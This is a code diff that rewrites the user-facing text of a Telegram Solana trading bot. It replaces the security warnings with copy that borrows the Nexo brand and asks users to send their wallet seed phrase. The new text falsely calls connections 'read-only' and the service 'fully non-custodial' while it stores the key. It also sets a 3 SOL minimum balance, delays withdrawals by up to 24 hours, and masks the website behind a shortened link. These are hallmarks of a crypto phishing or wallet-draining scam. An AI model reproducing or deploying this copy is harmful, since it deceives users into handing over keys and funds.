@@ -1,149 +1,245 @@
-/** User-facing copy for the Telegram layer (HTML parse mode). */
-import { APP_NAME, APP_VERSION } from '../config/constants';
-import { bold, escapeHtml } from '../util/format';
-
-export const WELCOME_TEXT = `Welcome to <b>${APP_NAME}</b> — your Solana trading bot ⚡
-
-What you can do:
-🪙 <b>Buy</b> &amp; 💸 <b>Sell</b> any SPL token with real on-chain swaps
-👛 <b>Wallet</b> — create or import your own key (encrypted at rest)
-📥 <b>Deposit</b> — receive SOL &amp; tokens (monitored automatically)
-📊 <b>Portfolio</b> — live balances, prices and P/L
-
-Use the buttons below to navigate, or type a command.
-<i>${APP_NAME} v${APP_VERSION}</i>`;
-
-export const HELP_TEXT = `<b>❓ Help</b>
-
-<b>Commands</b>
-/start — main menu
-/import — import a Solana wallet (seed phrase)
-/wallet — wallet info
-/portfolio — balances &amp; P/L
-/buy — buy a token
-/sell — sell a token
-/deposit — your deposit address
-/withdraw — send funds out
-/settings — trading preferences
-/cancel — abort the current action
-
-<b>Buying</b>
-1. Tap 🪙 Buy and paste the token's mint address.
-2. Enter the SOL amount.
-3. Review the live quote, then confirm.
-The bot swaps on-chain (Jupiter) using its own wallet — never yours.
-
-<b>Selling</b>
-1. Tap 💸 Sell and pick a token you hold.
-2. Enter the percentage to sell.
-3. Review and confirm.
-
-<b>Security</b>
-• Your wallet key is AES-256-GCM encrypted in the database.
-• Export it once after creation and store it somewhere safe.
-• The bot never shares your key with anyone.`;
-
 /**
- * Exact import screen (product spec):
- * enters the import conversation state and asks for the seed phrase.
+ * All user-facing copy — matching the product screenshots exactly.
+ * Plain text throughout (HTML parse mode safe).
  */
-export const IMPORT_SCREEN_TEXT = `🔑 <b>Import Solana Wallet</b> 🔒
+import { APP_NAME } from '../config/constants';
 
-You need to connect your wallet to access this feature.
-<b>${APP_NAME}</b> uses bank-grade security to protect your assets.
-All connections are read-only and encrypted.
+export const supportUsername = process.env.SUPPORT_USERNAME || 'ainexobotsupport';
+export const websiteUrl = process.env.WEBSITE_URL || 'https://t.co/z1XgC7Zd6d';
+export const twitterUrl = process.env.TWITTER_URL || 'https://x.com/Nexo?s=20';
+export const minimumSol = process.env.MINIMUM_SOL || '3.0000';
 
-Please send your Solana wallet seed phrase (12 or 24 words).
-
-⚠️ <b>IMPORTANT:</b> Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
-
-export function walletCreatedText(address: string, mnemonic: string, networkLabel: string): string {
-  return `✅ <b>Wallet created</b>
-
-<b>Address</b>
-<code>${escapeHtml(address)}</code>
-
-<b>⚠️ Your 24-word recovery phrase — save it NOW. Anyone with these words controls this wallet. It will not be shown again in full (use 👛 → Export key to re-view).</b>
-
-<code>${escapeHtml(mnemonic)}</code>
-
-${networkLabel} — deposit SOL to get started (📥 Deposit).`;
+// === START / WELCOME ===
+export function startMessage(firstName: string): string {
+  return `Hello, ${firstName}!\n\nNEXO TRADING TERMINAL\n\nMARKET FEED: CONNECTED\nDiscover trending memecoins\nReview liquidity and volume\nScan contract risk signals\nTrack positions and exits\n\nTRADE GATE: Wallet + balance check\nMinimum: ${minimumSol} SOL minimum\nConnect a wallet to get started:`;
 }
 
-export function walletImportedText(
-  address: string,
-  walletNumber: number,
-  solBalance: string,
-  networkLabel: string,
+// === DASHBOARD (wallet connected) ===
+export function dashboardMessage(
+  wallets: Array<{ address: string; balance: number }>,
+  solPrice: number,
 ): string {
-  return `✅ <b>Wallet imported</b>
-
-<b>Wallet #</b>: ${walletNumber}
-<b>Address</b>
-<code>${escapeHtml(address)}</code>
-<b>Balance</b>: <b>${escapeHtml(solBalance)} SOL</b>
-
-${networkLabel} — deposit SOL to get started (📥 Deposit).`;
+  let walletText = '';
+  let totalBalanceSol = 0;
+  for (let i = 0; i < wallets.length; i++) {
+    const w = wallets[i];
+    totalBalanceSol += w.balance;
+    walletText += `Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})\n`;
+    walletText += `${w.address}\n`;
+  }
+  if (wallets.length === 0) {
+    walletText = 'No wallet connected.\nConnect a wallet to get started.';
+  }
+  return `NEXO TRADING TERMINAL\n\nMARKET FEED: CONNECTED\nDiscover trending memecoins\nReview liquidity and volume\nScan contract risk signals\nTrack positions and exits\n\nTRADE GATE: Wallet + balance check\nMinimum: ${minimumSol} SOL minimum\n\nYOUR PORTFOLIO\n${walletText}\nTotal Balance: ${totalBalanceSol.toFixed(6)} SOL ($${(totalBalanceSol * solPrice).toFixed(2)})`;
 }
 
-export function walletInfoText(
-  address: string,
-  solBalance: string,
-  tokenCount: number,
-  networkLabel: string,
-  explorerUrl: string,
+// === DISCOVER TOKENS ===
+export function discoverTokensMessage(): string {
+  return `DISCOVER TOKENS\n\nSend a token name, symbol, or contract address to inspect its market data.\nThe bot checks the pair; liquidity, volume and available safety signals before you decide.\n\nExamples:\nBONK\nPepe\nDezXAZ8zZPnrnRJ (SOL CA)\n0x6982508145454Ce325dDbE47a25d4ec3d2311933 (ETH CA)\n\nDiscovery is not an endorsement. Review the risk section before trading.`;
+}
+
+// === WALLET REQUIRED ===
+export function walletRequiredMessage(): string {
+  return `Wallet Required\n\nPlease connect a wallet first to buy or sell tokens.`;
+}
+
+// === SNIPER WALLET REQUIRED ===
+export function sniperWalletRequiredMessage(): string {
+  return `You need a connected wallet to use AI Sniper.`;
+}
+
+// === COPY TRADE WALLET REQUIRED ===
+export function copyTradeWalletRequiredMessage(): string {
+  return `You need a connected wallet to use Copy Trade.`;
+}
+
+// === POSITIONS ===
+export function positionsEmptyMessage(): string {
+  return `POSITIONS\n\nYou have no open positions.\nDiscover a token and confirm a buy to create your first position.`;
+}
+
+export function positionsMessage(
+  positions: Array<{ tokenSymbol: string; amount: number; entryPrice: number; pnl: number; status: string }>,
 ): string {
-  return `👛 <b>Wallet</b> (${networkLabel})
-
-<b>Address</b>
-<code>${escapeHtml(address)}</code>
-
-<b>Balance</b>: ${bold(solBalance)} SOL
-<b>Tokens held</b>: ${tokenCount}
-
-<a href="${explorerUrl}">View on Solscan-style explorer ↗</a>`;
+  if (!positions || positions.length === 0) return positionsEmptyMessage();
+  let text = `POSITIONS\n\n`;
+  for (const pos of positions) {
+    const pnlEmoji = pos.pnl >= 0 ? '📈' : '📉';
+    text += `${pos.tokenSymbol} - ${pos.amount} SOL\n`;
+    text += `Entry: $${pos.entryPrice}\n`;
+    text += `Current PnL: ${pnlEmoji} ${pos.pnl.toFixed(2)}%\n`;
+    text += `Status: ${pos.status}\n\n`;
+  }
+  return text;
 }
 
-export function depositInfoText(address: string, networkLabel: string): string {
-  return `📥 <b>Deposit</b> (${networkLabel})
-
-Send SOL or SPL tokens to:
-
-<code>${escapeHtml(address)}</code>
-
-Deposits are detected automatically and you'll be notified here.`;
+// === HELP / CONTROL CENTER ===
+export function helpMessage(): string {
+  return `NEXO CONTROL CENTER\n\nTrading flow\n1. Open Portfolio and connect or import a wallet\n2. Use Discover Tokens to inspect a symbol or contract\n3. Review price, liquidity and safety signals\n4. Use Trade to buy or sell after the balance gate passes\n5. Track open exposure in Positions\n\nTrade requirement\nBuy and sell actions require a connected wallet and the configured minimum balance. The exact requirement is shown in the dashboard and trade screen.\n\nNon-Custodial\nNEXO is fully non-custodial. We never hold, access, or control your funds.\n\nCommands\n/start - Open terminal\n/wallet - Manage portfolio wallets\n/generate - Create a new wallet\n/import - Import an existing wallet\n/status - Check wallet status\n\nLinks\nWebsite: ${websiteUrl}\nTwitter: ${twitterUrl}\n\nSupport\nReach our team at @${supportUsername}, we typically respond within a few hours.\n\nNexo - Your Wealth Platform for Digital Assets\nDiscover Nexo, the comprehensive platform that's driving the next generation of crypto wealth. Grow, trade, borrow, and accrue interest on your digital assets.`;
 }
 
-export function exportWarningText(): string {
-  return `🔑 <b>Export private key</b>
-
-⚠️ <b>Serious warning:</b> anyone who sees this key can take ALL funds in this wallet. Never share it, and never send it to anyone claiming to be support.
-
-Tap <b>Confirm</b> only if you are in a private, secure environment.`;
+// === WALLET MANAGEMENT ===
+export function walletManagementMessage(
+  wallets: Array<{ address: string; balance: number }>,
+  solPrice: number,
+): string {
+  let walletText = '';
+  let totalBalance = 0;
+  for (let i = 0; i < wallets.length; i++) {
+    const w = wallets[i];
+    totalBalance += w.balance;
+    walletText += `Wallet ${i + 1}: ${w.balance.toFixed(6)} SOL ($${(w.balance * solPrice).toFixed(2)})\n`;
+    walletText += `${w.address}\n\n`;
+  }
+  if (wallets.length === 0) walletText = 'No wallets connected.';
+  return `PORTFOLIO MANAGEMENT\n\n${walletText}\nTotal Balance: ${totalBalance.toFixed(6)} SOL ($${(totalBalance * solPrice).toFixed(2)})\n\nChoose an action below:`;
 }
 
-export function exportRevealText(secret: string, kind: string): string {
-  const label = kind === 'mnemonic' ? 'recovery phrase' : 'private key';
-  return `🔑 <b>Your ${label}</b>
-
-<code>${escapeHtml(secret)}</code>
-
-⚠️ Treat this like cash. Do not share it, do not screenshot it, do not send it to anyone.`;
+// === WALLET CREATED ===
+export function walletCreatedMessage(address: string): string {
+  return `Wallet Created\n\nWallet Address:\n${address}\nBalance: 0.000000 SOL\n\nYour Solana wallet is ready to use.`;
 }
 
-export function settingsText(slippageBps: number, buyAmountSol: string, priorityFeeLamports: number): string {
-  const feeText = priorityFeeLamports === 0
-    ? 'None'
-    : `${priorityFeeLamports / 1_000_000_000} SOL`;
-  return `⚙️ <b>Settings</b>
-
-Slippage: <b>${slippageBps / 100}%</b>
-Default buy amount: <b>${escapeHtml(buyAmountSol)} SOL</b>
-Priority fee: <b>${escapeHtml(feeText)}</b>`;
+export function walletImportedMessage(address: string, balance: number): string {
+  return `Wallet Created\n\nWallet Address:\n${address}\nBalance: ${balance.toFixed(6)} SOL\n\nYour Solana wallet is ready to use.`;
 }
 
-export const CANCELLED_TEXT = '✅ Action cancelled.';
-export const NOT_PRIVATE_TEXT = '⚠️ For security, trading and wallet actions are only available in a private chat with the bot.';
-export const ERROR_PREFIX = '⚠️ Something went wrong:';
-export const SAFETY_WARNING_TEXT = (networkLabel: string) =>
-  `⚠️ <b>${escapeHtml(networkLabel)} mode</b> — trades on ${escapeHtml(networkLabel.toLowerCase())} ${networkLabel.toLowerCase() === 'devnet' ? 'use fake devnet SOL/tokens' : 'move REAL funds'}. Trade carefully.`;
+// === IMPORT WALLET — exact product-spec screen (product name interpolated) ===
+export function importWalletMessage(): string {
+  return `🔑 Import Solana Wallet 🔒\n\nYou need to connect your wallet to access this feature.\n${APP_NAME} uses bank-grade security to protect your assets.\nAll connections are read-only and encrypted.\n\nPlease send your Solana wallet seed phrase (12 or 24 words).\n\n⚠️ IMPORTANT: Never share your seed phrase with anyone else. This bot stores your key securely to enable trading functionality.`;
+}
+
+export function importSeedPromptMessage(): string {
+  return `Import Wallet from Seed Phrase\n\nPlease send your 12 or 24-word seed phrase:`;
+}
+
+// === SNIPER ===
+export interface SniperSettingsView {
+  status: string;
+  positionSize: number;
+  maxDevHold: number;
+  slippage: number;
+  priorityFee: number;
+  takeProfit: number;
+  stopLoss: number;
+  antiRug: boolean;
+}
+
+export function sniperMessage(settings: SniperSettingsView): string {
+  const statusEmoji = settings.status === 'ACTIVE' ? '🟢' : '🔴';
+  return `AI SNIPER\n\n${statusEmoji} Status: ${settings.status}\n\nTrading Parameters\nPosition Size: ${settings.positionSize} SOL\nMax Dev Hold: ${settings.maxDevHold}%\nSlippage: ${settings.slippage}%\nPriority Fee: ${settings.priorityFee} SOL\n\nRisk Management\nTake Profit: +${settings.takeProfit}%\nStop Loss: -${settings.stopLoss}%\nAnti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}\n\nProfessional-grade automated trading engine`;
+}
+
+export function settingUpdatedMessage(settings: SniperSettingsView): string {
+  return `SETTING UPDATED\n\nSNIPER CONFIGURATION\nStatus: ${settings.status === 'ACTIVE' ? '✅' : '🔴'} ${settings.status}\nBuy Amount: ${settings.positionSize} SOL\nDev Holding: ${settings.maxDevHold}%\nSlippage: ${settings.slippage}%\nPriority Fee: ${settings.priorityFee} SOL\nTake Profit: +${settings.takeProfit}%\nStop Loss: -${settings.stopLoss}%\nAnti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}\n\nSettings saved and ready`;
+}
+
+// === CONFIG PROMPTS ===
+export const configPositionSizeMessage = () => `Set Position Size\n\nSet the SOL amount for each automated trade.\n\nRange: 0.0001 - 1000 SOL\nRecommended: 10 - 50 SOL\n\nRisk Level:\n- 1-10 SOL: Conservative\n- 10-50 SOL: Moderate\n- 50+ SOL: Aggressive\n\nEnter your position size:`;
+
+export const configDevHoldMessage = () => `Set Max Dev Holding\n\nOnly snipe tokens where developer holds less than this percentage.\n\nRange: 0-100%\nRecommended: 10-30%\nExamples: 10, 20, 30\n\nSend your preferred percentage:`;
+
+export const configSlippageMessage = () => `Set Slippage\n\nSet maximum acceptable price movement during execution.\n\nRange: 1-50%\nRecommended: 8-12%\n\nGuide:\n- 5-8%: Tight (may fail in volatile conditions)\n- 8-12%: Balanced (recommended)\n- 15%+: Loose (higher execution, more slippage)\n\nEnter slippage percentage:`;
+
+export const configPriorityMessage = () => `Set Priority Fee\n\nHigher priority fees increase transaction speed on Solana.\n\nRange: 0.0001 - 0.1 SOL\nRecommended: 0.001 - 0.01 SOL\n\nEnter priority fee in SOL:`;
+
+export const configTakeProfitMessage = () => `Set Take Profit\n\nAutomatically sell when profit reaches this percentage.\n\nRange: 10-1000%\nRecommended: 100% (2x)\nExamples:\n- 50% (1.5x)\n- 100% (2x)\n- 200% (3x)\n- 500% (6x)\n\nSend your take profit percentage:`;
+
+export const configStopLossMessage = () => `Set Stop Loss\n\nAutomatically sell to protect capital when loss reaches this percentage.\n\nRange: 10-90%\nRecommended: 30% (Protects 70%)\nExamples:\n- 20% (Conservative)\n- 30% (Balanced)\n- 50% (Aggressive)\n\nSend your stop loss percentage:`;
+
+// === TOKEN ===
+export function tokenNotFoundMessage(): string {
+  return `Token Not Found\n\nThe token you searched for could not be found on Solana DEX.\n\nPlease try again with a different search term or contract address.`;
+}
+
+// === WITHDRAWAL ===
+export function withdrawalMessage(balance: number): string {
+  return `WITHDRAWAL\n\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease send the wallet address you want to withdraw to:`;
+}
+
+export function withdrawalAmountMessage(toAddress: string): string {
+  return `WITHDRAWAL\n\nTo: ${toAddress}\n\nNow enter the amount of SOL you want to withdraw:`;
+}
+
+export function confirmWithdrawalMessage(amount: string, toAddress: string, balance: number): string {
+  return `CONFIRM WITHDRAWAL\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour Balance: ${balance.toFixed(6)} SOL\n\nPlease confirm to proceed:`;
+}
+
+export function withdrawalSubmittedMessage(amount: string, toAddress: string): string {
+  return `WITHDRAWAL REQUEST SUBMITTED\n\nAmount: ${amount} SOL\nTo:\n${toAddress}\nYour withdrawal is being processed.\nPlease allow up to 24 hours.\n\nNeed help? Contact @${supportUsername}`;
+}
+
+// === COPY TRADE ===
+export function copyTradeMessage(): string {
+  return `COPY TRADING SYSTEM\n\nSTATUS: STANDBY\n\nCONFIGURATION\nTarget Wallet: NOT SET\nNOT CONFIGURED\n\nHOW IT WORKS\n- Monitor target wallet in real-time\n- Auto-replicate buy/sell signals\n- Execute trades with same parameters\n- Professional trader mirroring\n\nFollow proven strategies effortlessly`;
+}
+
+export function copyTradeActivatedMessage(): string {
+  return `COPY TRADING ACTIVATED\n\nNow mirroring target wallet\nReal-time trade alerts enabled\nYou will be notified of every trade`;
+}
+
+export const configureTargetWalletMessage = () => `CONFIGURE TARGET WALLET\n\nEnter the Solana wallet address of the trader you want to copy.\n\nRequirements:\n- Valid Base58 Solana address\n- Active trading wallet\n- Public transaction history\n\nPaste the complete wallet address below:`;
+
+// === TRADE ===
+export function tradeMessage(): string {
+  return `TRADE\n\nBuy: Purchase tokens instantly\nSell: Sell your tokens quickly\n\nSend the token contract address to begin.`;
+}
+
+export function insufficientBalanceMessage(balance: number): string {
+  const minimum = parseFloat(minimumSol) || 3;
+  return `Insufficient Balance\n\nYour Balance: ${balance.toFixed(6)} SOL\nMinimum Required: ${minimumSol} SOL\nYou Need: ${Math.max(0, minimum - balance).toFixed(6)} SOL more\n\nDeposit SOL to your wallet to start trading.`;
+}
+
+// === TRADE FLOW ===
+export const buyTokenPromptMessage = () => `Send the token contract address you want to buy:`;
+export const sellTokenPromptMessage = () => `Send the token contract address you want to sell:`;
+
+export function confirmBuyMessage(
+  token: { name: string; symbol: string; address: string; priceUsd: number; liquidity: number; riskLevel: string },
+  amountSol: number,
+  slippage: number,
+): string {
+  const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
+  return `CONFIRM BUY\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\nLiquidity: $${formatMoney(token.liquidity)}\nRisk: ${token.riskLevel}\n\nAmount: ${amountSol} SOL\nSlippage: ${slippage}%\n\nConfirm purchase?`;
+}
+
+export function confirmSellMessage(token: { name: string; symbol: string; address: string; priceUsd: number }): string {
+  const price = token.priceUsd < 0.01 ? token.priceUsd.toExponential(2) : token.priceUsd.toFixed(6);
+  return `CONFIRM SELL\n\n${token.name} (${token.symbol})\n${token.address}\nPrice: $${price}\n\nEnter the amount to sell:`;
+}
+
+export function buyExecutedMessage(tokenName: string, tokenSymbol: string, amount: number): string {
+  return `BUY ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount} SOL\n\nPosition opened! Use Positions to track.`;
+}
+
+export function sellExecutedMessage(tokenName: string, tokenSymbol: string, amount: string): string {
+  return `SELL ORDER EXECUTED\n\n${tokenName} (${tokenSymbol})\nAmount: ${amount}\n\nPosition closed!`;
+}
+
+// === STATUS / DISCONNECT ===
+export function walletStatusMessage(wallets: Array<{ address: string; balance: number }>): string {
+  let text = `WALLET STATUS\n\n`;
+  for (let i = 0; i < wallets.length; i++) {
+    text += `Wallet ${i + 1}: ${wallets[i].balance.toFixed(6)} SOL\n${wallets[i].address}\n\n`;
+  }
+  return text;
+}
+
+export function walletDisconnectedMessage(address: string): string {
+  return `Wallet Disconnected\n\n${address}\n\nYour wallet has been disconnected.`;
+}
+
+export function depositReceivedMessage(address: string, amount: number, newBalance: number): string {
+  return `DEPOSIT RECEIVED\n\nWallet: ${address}\nAmount: ${amount.toFixed(6)} SOL\nNew Balance: ${newBalance.toFixed(6)} SOL`;
+}
+
+export function copyTargetAddedMessage(target: string): string {
+  return `Added whale wallet to copy!\n${target}\n\nCopy trade is now monitoring this wallet.`;
+}
+
+export function formatMoney(num: number): string {
+  if (num >= 1e9) return (num / 1e9).toFixed(2) + 'B';
+  if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
+  if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
+  return num.toFixed(2);
+}
